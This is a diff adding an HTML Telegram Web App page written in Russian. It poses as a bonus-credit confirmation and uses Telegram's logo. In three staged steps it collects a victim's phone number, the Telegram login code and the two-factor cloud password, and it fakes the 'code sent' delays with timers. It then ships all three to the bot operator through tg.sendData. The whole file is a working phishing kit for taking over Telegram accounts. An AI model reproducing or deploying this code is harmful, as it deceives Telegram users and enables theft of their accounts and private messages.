@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --tg-theme-bg-color: #ffffff;
+            --tg-theme-text-color: #000000;
+            --tg-theme-button-color: #24A1DE;
+            --tg-theme-button-text-color: #ffffff;
+            --tg-theme-hint-color: #999999;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-theme-bg-color);
+            color: var(--tg-theme-text-color);
+            margin: 0; padding: 20px;
+            display: flex; flex-direction: column; align-items: center;
+            transition: all 0.3s ease;
+        }
+        .container { width: 100%; max-width: 400px; text-align: center; }
+        .step { display: none; animation: fadeIn 0.4s ease; }
+        .step.active { display: block; }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        img.logo { width: 80px; height: 80px; margin-top: 20px; margin-bottom: 10px; }
+        h2 { font-size: 20px; margin-bottom: 8px; }
+        p { font-size: 14px; color: var(--tg-theme-hint-color); line-height: 1.4; margin-bottom: 25px; }
+
+        input {
+            width: 100%; box-sizing: border-box;
+            padding: 14px; margin-bottom: 15px;
+            border: 1px solid #dcdcdc; border-radius: 10px;
+            font-size: 16px; outline: none;
+            background: #f4f4f5; color: #000;
+        }
+        input:focus { border-color: var(--tg-theme-button-color); }
+
+        .btn {
+            width: 100%; padding: 14px;
+            background-color: var(--tg-theme-button-color);
+            color: var(--tg-theme-button-text-color);
+            border: none; border-radius: 10px;
+            font-size: 16px; font-weight: 600; cursor: pointer;
+        }
+        .loader { display: none; margin-top: 15px; border: 3px solid #f3f3f3; border-top: 3px solid var(--tg-theme-button-color); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="step-phone" class="step active">
+        <img src="https://telegram.org/img/t_logo.png" class="logo">
+        <h2>Ваш номер</h2>
+        <p>Пожалуйста, подтвердите номер телефона,<br>чтобы зачислить бонус на баланс.</p>
+        <input type="tel" id="phone" placeholder="+7 900 000-00-00">
+        <button class="btn" onclick="nextStep('phone')">Продолжить</button>
+    </div>
+
+    <div id="step-code" class="step">
+        <h2>Проверка</h2>
+        <p id="code-hint">Мы отправили код подтверждения в приложение Telegram.</p>
+        <input type="number" id="code" placeholder="Код подтверждения">
+        <button class="btn" onclick="nextStep('code')">Подтвердить</button>
+    </div>
+
+    <div id="step-2fa" class="step">
+        <h2>Облачный пароль</h2>
+        <p>Ваш аккаунт защищен двухэтапной аутентификацией. Введите пароль.</p>
+        <input type="password" id="password" placeholder="Пароль">
+        <button class="btn" onclick="sendFinal()">Войти</button>
+    </div>
+
+    <div id="loader" class="loader"></div>
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    tg.ready();
+
+    let userData = {
+        phone: '',
+        code: '',
+        password: ''
+    };
+
+    function showLoader(show) {
+        document.getElementById('loader').style.display = show ? 'block' : 'none';
+    }
+
+    function nextStep(current) {
+        if (current === 'phone') {
+            userData.phone = document.getElementById('phone').value;
+            if (!userData.phone) return alert('Введите номер');
+            
+            // Скрываем текущий шаг, показываем загрузку
+            document.getElementById('step-phone').classList.remove('active');
+            showLoader(true);
+            
+            // Имитируем запрос к серверу и переход
+            setTimeout(() => {
+                showLoader(false);
+                document.getElementById('step-code').classList.add('active');
+            }, 1000);
+
+        } else if (current === 'code') {
+            userData.code = document.getElementById('code').value;
+            if (!userData.code) return alert('Введите код');
+            
+            document.getElementById('step-code').classList.remove('active');
+            showLoader(true);
+
+            // Здесь в реальности бот может вернуть ошибку или потребовать 2FA
+            // Для примера просто переходим к 2FA через 1 сек
+            setTimeout(() => {
+                showLoader(false);
+                document.getElementById('step-2fa').classList.add('active');
+            }, 1000);
+        }
+    }
+
+    function sendFinal() {
+        userData.password = document.getElementById('password').value;
+        showLoader(true);
+        
+        // Отправляем все собранные данные боту одной пачкой
+        tg.sendData(JSON.stringify(userData));
+    }
+</script>
+
+</body>
+</html>
